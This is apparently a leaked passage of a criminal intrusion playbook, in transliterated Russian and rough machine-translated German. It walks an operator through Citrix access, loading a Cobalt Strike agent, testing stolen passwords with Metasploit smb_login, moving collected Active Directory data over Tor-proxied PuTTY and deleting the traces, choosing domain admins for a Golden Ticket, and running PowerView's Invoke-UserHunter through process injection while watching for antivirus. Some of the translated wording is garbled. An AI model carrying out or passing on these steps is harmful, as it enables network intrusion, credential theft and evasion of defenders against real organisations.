Dlya win 7: https://www.citrix.com/en-gb/downloads/workspace-app/legacy-workspace-app-for-windows-ltsr/workspace-app-for-windows-1912-ltsr-cu2.html
Dlya win10: https://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.htmlhttps://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.htmla win 10: 
https://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.html

Ustanavlivaem citrix
Dalee v brauzere vhodim v web-interface citrixa, vvodim login-pass potom zapuskaem deesktop (otkroetsya libo v browsere ili v citrixAPP) 

posle vhoda v desktop - podtyagivaem agenta v CS

!------------------------------------------------------Questions----------------------------------------------------------!


14) Wenn Sie ein Passwort finden, können Sie es auch durch smb_login laufen lassen, ein Instrument in Metasploit. Ich werde Ihnen ein Metasploit geben und Ihnen sagen, wie Sie es benutzen. smb_login zeigt Ihnen, auf welche Server oder Würmer Sie mit diesen Anmeldeinformationen Zugriff haben

So sortieren Sie das gesammelte AD aus dem Netzwerk
1)FileZilla herunterladen
2)Putty herunterladen, putty via tor
Gehen Sie hier https://www.torproject.org/download/tor/
Das Experten-Paket herunterladen
Entpacken, in das Tor-Verzeichnis wechseln und tor.exe ausführen
Nach ein paar Sekunden wird der Text 100% Done erreicht.
In den Putty-Einstellungen gehen Sie zu proxy, setzen Sie sox5, IP 127.0.0.1 port 9050
3)Gehen Sie über filesilla auf den Server > gehen Sie in das Verzeichnis "Script" - legen Sie die AD-Dateien neben dem Script ab
4) Gehen Sie zu Putty, loggen Sie sich auf dem Server ein, navigieren Sie zu dem Verzeichnis, in dem das Skript liegt, geben Sie den Befehl 
./script.sh
5) Fertig, gehen Sie zurück zu FilleZilla und rufen Sie unser Sortiergerät ab. Achten Sie darauf, die AD-Dateien und den Ordner sorterd anschließend zu entfernen; wenn der Ordner sorterd nicht gelöscht wird, ändern Sie ihn einfach in einen beliebigen Namen


Das USERCHANTER-Handbuch wird verwendet, um diese Fahrzeuge zu finden. Wir brauchen ad_users auch, um die SID für das Goldene Ticket zu bekommen, aber dazu später mehr
. Erstellung einer Liste von Zielen 
1.1 Öffnen Sie Ad_Users , suchen Sie dort nach potentiellem Interesse: admin / engineer / information technology / IT 
Kontoanmeldungen von sAMAccountName übernehmen
1.2 Entnahme der Liste der Domänenadministratoren
1.3 die erste und zweite in die Datei list.txt eintragen

2. Aploadim Power View.
2.1 powershell-import _/home/user/soft/powerview/view.ps1_
2.1 --Kommentar: Importieren Sie die Power View von /home/user/soft/powerview/view.ps1

2.3 Auf der Jagd
2.3.1 
psinject 1884 x64 Invoke-UserHunter -Threads 20 -UserFile C:\ProgramData\list.txt >> C:\ProgramData\out.txt

statt 1884 - PID-Prozess, wo wir genügend Rechte haben, um zu injizieren.
x64- oder x86-Prozessdigitalisierung. siehe Tabellenliste
Die in Punkt 1 erstellte Liste sollte sich in c\programdata\list.txt befinden.. 
In 5-10-20 Minuten können Sie das Ergebnis in out.txt sehen. Wenn die Datei 0 Bytes hat, bedeutet das, dass sie funktioniert oder AV getroffen wurde (wenn AV getroffen wurde, sehen Sie das in der cob).